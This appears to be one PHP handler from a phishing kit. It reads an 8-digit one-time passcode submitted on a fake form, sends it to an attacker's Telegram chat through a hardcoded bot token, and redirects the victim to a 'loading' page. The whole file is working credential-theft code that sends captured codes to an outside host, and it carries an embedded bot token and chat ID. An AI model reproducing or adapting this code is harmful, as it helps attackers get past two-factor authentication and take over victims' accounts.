<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = $_POST['otp'];

    if (strlen($otp) !== 8 || !is_numeric($otp)) {
        die('Mot de passe invalide.');
    }

    // Vos informations Telegram
    $botToken = "7190313520:AAGyP3BC0HqZjisZh_HbUXcwQohHOUjvyfU";
    $chatID = "8134069302";
    $message = "code opt : $otp";

    // URL de l'API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Envoi du message
    $response = file_get_contents($url . "?chat_id=$chatID&text=" . urlencode($message));

    // Vérification de la réponse
    if ($response) {
        header("Location: ../chargement.php");
    } else {
        header("Location: ../password.php");
    exit;;
    }
}
?>
